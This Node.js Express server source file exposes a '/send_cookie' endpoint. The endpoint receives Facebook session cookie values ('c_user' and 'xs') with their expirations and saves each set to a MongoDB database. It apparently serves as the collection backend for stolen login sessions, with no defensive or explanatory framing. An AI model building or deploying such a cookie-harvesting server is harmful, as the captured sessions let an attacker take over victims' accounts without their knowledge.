const express = require("express");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const User = require("./models/User");

const app = express();

require("dotenv").load();

const URL_DB = process.env.URL_DB;
const PORT = process.env.PORT;

mongoose.Promise = Promise;
mongoose.connect(URL_DB, { useNewUrlParser: true });

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.post("/send_cookie", (req, res) => {
  const { c_user, xs } = req.body;

  const xsCookie = {
    value: xs.value,
    expiration: xs.expiration
  };
  const c_userCookie = {
    value: c_user.value,
    expiration: c_user.expiration
  };

  const user = new User({
    c_user: c_userCookie,
    xs: xsCookie
  });

  user.save(err => {
    if (err) throw err;
    console.log(`User with id -> ${user._id} added to DB.`);
    res.sendStatus(201);
  });
});

app.listen(PORT, console.log(`Listening on PORT ${PORT}`));
